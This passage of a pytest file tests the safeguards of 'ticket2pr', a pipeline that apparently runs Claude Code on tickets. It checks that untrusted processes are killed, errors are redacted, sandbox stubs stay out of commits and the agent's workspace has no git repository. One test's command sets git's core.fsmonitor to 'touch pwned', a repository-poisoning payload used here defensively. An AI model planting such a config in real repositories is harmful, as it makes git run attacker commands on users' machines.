    make_pipeline: MakePipeline, store: JobStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls: list[str] = []

    def fake_kill() -> int:
        calls.append("reap")
        return 0

    monkeypatch.setattr("ticket2pr.pipeline.kill_descendants", fake_kill)
    agent = ScriptedAgent([fix_add], outcome=AgentOutcome.BUDGET_EXCEEDED)
    job = await make_pipeline(agent).run(claim(store, "CALC-1"))
    assert job.status is JobStatus.FAILED
    assert calls == ["reap", "reap"]  # before the first clone, and when the job ended


@pytest.mark.parametrize(
    ("exc", "public"),
    [
        (PolicyViolationError("too big"), "too big"),
        (SCMError("remote: secret/path.py"), "a git or forge operation failed"),
        (TrackerError("Jira 500: body"), "the ticket could not be read or updated"),
        (OSError("/w/secret_name"), "internal error"),
    ],
)
def test_ticket_only_sees_errors_ticket2pr_worded(exc: Exception, public: str) -> None:
    assert _public_error(exc, str(exc)).startswith(public)


async def test_the_agent_gets_no_git_repository(
    make_pipeline: MakePipeline, store: JobStore
) -> None:
    """Claude Code runs git in its working directory, unsandboxed: no .git anyone can poison,
    not even one the previous attempt's tests created."""
    seen: list[bool] = []

    def look(task: AgentTask) -> None:
        seen.append((task.workspace / ".git").exists())

    poisoning_tests = "git init -q . && git config core.fsmonitor 'touch pwned' && false"
    agent = ScriptedAgent([look, look])
    await make_pipeline(agent, test_command=poisoning_tests).run(claim(store, "CALC-1"))
    assert seen == [False, False]


async def test_sandbox_mount_stubs_are_not_committed(
    make_pipeline: MakePipeline,
    store: JobStore,
    repos_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    (repos_dir / REPO / "yarn.lock").touch()  # a tracked empty stub name: the repo's own
    git(repos_dir / REPO, "add", "yarn.lock")
    git(repos_dir / REPO, "commit", "-q", "-m", "empty lock")

    def fix_and_leave_stubs(task: AgentTask) -> None:
        fix_add(task)
        for name in (".npmrc", ".gitmodules"):
            (task.workspace / name).touch()  # what Claude Code's sandbox leaves behind
        (task.workspace / "real.json").write_text("{}")
        (task.workspace / "package.json").symlink_to("real.json")  # not a stub: kept
        (task.workspace / "yarn.lock").write_text("")  # existed before: kept as is
        (task.workspace / "empty_module.py").touch()  # the agent's own empty file stays

    # The stubs come with Claude Code's sandbox; the tests here run unsandboxed.
    monkeypatch.setattr("ticket2pr.pipeline.ensure_sandbox_available", lambda: None)
    monkeypatch.setattr("ticket2pr.pipeline.sandbox_profile", lambda _settings: None)
    pipeline = make_pipeline(ScriptedAgent([fix_and_leave_stubs]), sandbox=True)
    job = await pipeline.run(claim(store, "CALC-1"))
    files = git(repos_dir / REPO, "show", "--name-only", "--format=", _branch(job)).split()
    assert sorted(files) == ["calc.py", "empty_module.py", "package.json", "real.json"]


@pytest.mark.parametrize("failing_call", [2, 3])  # 2: the pre-publish sweep, 3: the final one
async def test_surviving_leftovers_block_publishing_only(
    make_pipeline: MakePipeline,
    store: JobStore,
    repos_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
    failing_call: int,
) -> None:
    """Survivors before the push stop it; after the job they are only logged."""
    status = "failed" if failing_call == 2 else "succeeded"
    calls = 0

    def sweep() -> int:
        nonlocal calls
        calls += 1
        if calls == failing_call:
            raise PolicyViolationError("1 leftover untrusted process(es) survived; not publishing")
        return 0

    monkeypatch.setattr("ticket2pr.pipeline.kill_descendants", sweep)
    job = await make_pipeline(ScriptedAgent([fix_add])).run(claim(store, "CALC-1"))
    assert job.status.value == status
    pushed = git(repos_dir / REPO, "branch", "--list", "ticket2pr/*").strip()
    assert bool(pushed) is (status == "succeeded")
